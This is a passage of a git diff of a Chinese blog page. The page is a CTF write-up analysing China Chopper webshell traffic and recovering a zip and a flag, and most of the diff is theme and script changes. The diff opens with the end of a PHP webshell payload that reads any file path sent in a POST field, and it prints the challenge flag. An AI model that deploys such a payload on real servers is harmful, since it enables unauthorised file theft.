class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从POST请求中获取base64编码的文件路径，并进行解码</span></span><br><span class="line"><span class="variable">$F</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以只读模式打开文件</span></span><br><span class="line"><span class="variable">$P</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否成功打开</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果文件打开失败，输出错误信息并终止脚本</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// File cannot be opened.&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容，filesize($F)获取文件大小，确保读取整个文件</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件句柄，释放资源</span></span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符，用于标识响应结束</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> </div></details>
 
 <p>读取 zip 接着的下个 php 文件，即为 zip 文件，我们将后缀修改为<code>.zip</code>，用 WinHex 查看。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/5.png" alt="traffic_analysis_1"><br>注意到<a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/archive/zip/">zip 文件头</a>多了<code>2D3E7C</code>，文件尾多了<code>7C3C2D</code>，我们将其删除，发现压缩包已经可以正常打开但是有密码。</p>
+<p><img src="/assets/CTF/Misc/traffic_analysis_1/5.png" alt="traffic_analysis_1"><br>注意到<a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/archive/zip/">zip 文件头</a>多了<code>2D3E7C</code>，文件尾多了<code>7C3C2D</code>，我们将其删除，发现压缩包已经可以正常打开但是有密码。</p>
 <blockquote>
 <p>zip 的文件头由<code>504B0304</code>开头</p>
 </blockquote>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/6.png" alt="traffic_analysis_1"></p>
+<p><img src="/assets/CTF/Misc/traffic_analysis_1/6.png" alt="traffic_analysis_1"></p>
 <p>我们输入前面拿到的关键信息<code>Th1s_1s_p4sswd_!!!</code>后，拿到<code>flag.txt</code>。<br>最终 flag 为<code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code>。</p>
 <h2 id="优化点"><a href="#优化点" class="headerlink" title="优化点"></a>优化点</h2><ul>
-<li>zip 可以直接用 Binwalk 提取<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/7.png" alt="traffic_analysis_1"></li>
+<li>zip 可以直接用 Binwalk 提取<br><img src="/assets/CTF/Misc/traffic_analysis_1/7.png" alt="traffic_analysis_1"></li>
 <li>可以只看 request 头和 response 包体</li>
 <li>jpg 文件头由<code>FFD8FF</code>开头，由<code>FFD9</code>结尾，可以快速确定是个图片。</li>
 <li>保存图片可以用 WinHex 打开那个报文后，删除多余信息，另存为<code>.jpg</code>文件</li>
@@ -147,45 +148,45 @@
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/robacco/article/details/104908322">Misc 第八篇——功夫再高也怕菜刀（数据恢复、报文分析）</a></li>
 </ul>
-
-<div class="article-footer fs14">
+</article>
+<div class="article-footer">
     <section id="license">
       <div class="header"><span>许可协议</span></div>
       <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
 </div>
     </section>
     
+
+
     <section id="share">
       <div class="header"><span>分享文章</span></div>
       <div class="body">
-        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html" /></div>
-        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html&title=【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析 - 半岛的小屋&summary=使用 wireshark 打开pcapng文件，分析流量，发现图片和 zip 压缩包，图片为压缩包密码，解压后得到 flag。"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析 - 半岛的小屋&amp;body=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://www.bandao.ltd/CTF/Misc/traffic_analysis_1" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1&title=【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析 - 半岛的小屋&summary=使用 wireshark 打开pcapng文件，分析流量，发现图片和 zip 压缩包，图片为压缩包密码，解压后得到 flag。"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析 - 半岛的小屋&amp;body=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
         
         <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
-          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html"/>
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://www.bandao.ltd/CTF/Misc/traffic_analysis_1"/>
         </div>
         
       </div>
     </section>
     </div>
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/CTF/Misc/image_processing_1.html">【CTF】Misc图片处理题：ACTF wanna png</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/tutorial/github_domain.html">【技术教程】GitHub Pages 自定义域名配置指南</a></div></section></div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/CTF/Misc/image_processing_1/">【CTF】Misc图片处理题：ACTF wanna png</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/tutorial/github_domain/">【技术教程】GitHub Pages 自定义域名配置指南</a></div></section></div>
 
 
 
 
 
 
-<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">探索</span><a href="/link"><i class="fa-solid fa-link"></i> 友链</a><a target="_blank" rel="noopener" href="https://www.travellings.cn/go-by-clouds.html"><i class="fa-solid fa-subway"></i> 开往</a></div><div class="sitemap-group"><span class="fs15">社交</span><a target="_blank" rel="noopener" href="https://github.com/bandaoworld"><i class="fa-brands fa-github"></i> bandaoworld</a><a target="_blank" rel="noopener" href="https://space.bilibili.com/32187583"><i class="fa-brands fa-bilibili"></i> 半岛的孤城</a></div><div class="sitemap-group"><span class="fs15">信息</span><a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar"><i class="fa-solid fa-palette"></i> Hexo主题: Stellar</a><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><i class="fa-solid fa-shield-halved"></i> 陕ICP备2021008033号</a></div></div><div class="text"></div></footer>
+<footer class="page-footer footnote"><hr><div class="sitemap" style="column-count:3;"><div class="sitemap-group"><span class="fs15">探索</span><a href="/link"><i class="fa-solid fa-link"></i> 友链</a><a target="_blank" rel="noopener" href="https://www.travellings.cn/go-by-clouds.html"><i class="fa-solid fa-subway"></i> 开往</a></div><div class="sitemap-group"><span class="fs15">社交</span><a target="_blank" rel="noopener" href="https://github.com/bandaoworld"><i class="fa-brands fa-github"></i> bandaoworld</a><a target="_blank" rel="noopener" href="https://space.bilibili.com/32187583"><i class="fa-brands fa-bilibili"></i> 半岛的孤城</a></div><div class="sitemap-group"><span class="fs15">信息</span><a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar"><i class="fa-solid fa-palette"></i> Hexo主题: Stellar</a><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><i class="fa-solid fa-shield-halved"></i> 陕ICP备2021008033号</a></div></div><div class="text"></div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
 <div class="widgets">
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Wireshark-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">1. Wireshark 流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">2. php 代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Hex-%E8%BD%AC%E5%86%99-Jpg"><span class="toc-text">3. Hex 转写 Jpg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-zip-%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">4. zip 文件头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96%E7%82%B9"><span class="toc-text">优化点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div><div class="widget-footer">
-
-<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
-</div></aside><div class='float-panel blur'>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Wireshark-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">1. Wireshark 流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">2. php 代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Hex-%E8%BD%AC%E5%86%99-Jpg"><span class="toc-text">3. Hex 转写 Jpg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-zip-%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">4. zip 文件头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96%E7%82%B9"><span class="toc-text">优化点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
@@ -194,7 +195,10 @@
   </button>
 </div>
 </div><div class="scripts">
+
+
 <script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
   const ctx = {
     date_suffix: {
       just: `刚刚`,
@@ -203,6 +207,9 @@
       day: `天前`,
     },
     root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
   };
 
   // required plugins (only load if needs)
@@ -210,23 +217,66 @@
     ctx.search = {};
     ctx.search.service = `local_search`;
     if (ctx.search.service == 'local_search') {
-      let service_obj = Object.assign({}, `{"field":"post","path":"/search.json","content":true,"sort":"-date"}`);
+      let service_obj = Object.assign({}, `{"field":"post","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
       ctx.search[ctx.search.service] = service_obj;
     }
   }
   const def = {
     avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
     cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
   };
   const deps = {
-    jquery: `https://fastly.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
-    marked: `https://fastly.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+    jquery: `https://lib.baomitu.com/jquery/3.7.1/jquery.js`,
+    marked: `https://lib.baomitu.com/marked/16.3.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
   }
   
 
 </script>
 
 <script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
   const utils = {
     // 懒加载 css https://github.com/filamentgroup/loadCSS
     css: (href, before, media, attributes) => {
@@ -289,7 +339,7 @@
 
     js: (src, opt) => new Promise((resolve, reject) => {
       var script = document.createElement('script');
-      if (src.startsWith('/')){
+      if (src.startsWith('/')) {
         src = ctx.root + src.substring(1);
       }
       script.src = src;
@@ -302,7 +352,7 @@
         script.async = true
       }
       script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
+      script.onload = script.onreadystatechange = function () {
         const loadState = this.readyState
         if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
         script.onload = script.onreadystatechange = null
@@ -318,7 +368,7 @@
         fn()
       }
     },
-    
+
     onLoading: (el) => {
       if (el) {
         $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
@@ -337,54 +387,105 @@
       }
     },
     request: (el, url, callback, onFailure) => {
-      let retryTimes = 3;
-      utils.onLoading(el);
-      function req() {
-        return new Promise((resolve, reject) => {
-          let status = 0; // 0 等待 1 完成 2 超时
-          let timer = setTimeout(() => {
-            if (status === 0) {
-              status = 2;
-              timer = null;
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
               reject('请求超时');
-              if (retryTimes == 0) {
-                onFailure();
-              }
+            } else {
+              setTimeout(load, 1000);
             }
           }, 5000);
-          fetch(url).then(function(response) {
-            if (status !== 2) {
-              clearTimeout(timer);
-              resolve(response);
-              timer = null;
-              status = 1;
-            }
-            if (response.ok) {
-              return response.json();
-            }
-            throw new Error('Network response was not ok.');
-          }).then(function(data) {
-            retryTimes = 0;
-            utils.onLoadSuccess(el);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
             callback(data);
-          }).catch(function(error) {
-            if (retryTimes > 0) {
-              retryTimes -= 1;
-              setTimeout(() => {
-                req();
-              }, 5000);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
             } else {
-              utils.onLoadFailure(el);
-              onFailure();
+              setTimeout(load, 1000);
             }
           });
-        });
-      }
-      req();
-    },
-  };
-</script>
+        };
 
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
 <script>
   const sidebar = {
     leftbar: () => {
@@ -438,9 +539,76 @@
   })()
 </script>
 
+<script async src="https://lib.baomitu.com/vanilla-lazyload/19.1.3/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
 
 <!-- required -->
-<script src="/js/main.js?v=1.29.1" defer></script>
+<script src="/js/main.js?v=1.33.1" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -450,12 +618,12 @@
       document.documentElement.setAttribute('data-theme', theme)
     }
 
-    applyThemeToGiscus(theme)
+    // applyThemeToGiscus(theme)
   }
 
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
   const applyThemeToGiscus = (theme) => {
-    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
-
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
     const cmt = document.getElementById('giscus')
     if (cmt) {
       // This works before giscus load.
@@ -487,6 +655,8 @@
     }
     applyTheme(newTheme)
     window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
 
     const messages = {
       light: `切换到浅色模式`,
@@ -501,7 +671,10 @@
     const theme = window.localStorage.getItem('Stellar.theme')
     if (theme !== null) {
       applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
     }
+    utils.dark.method.toggle.start();
   })()
 </script>
 
@@ -512,7 +685,7 @@
 
 <script defer>
   window.addEventListener('DOMContentLoaded', (event) => {
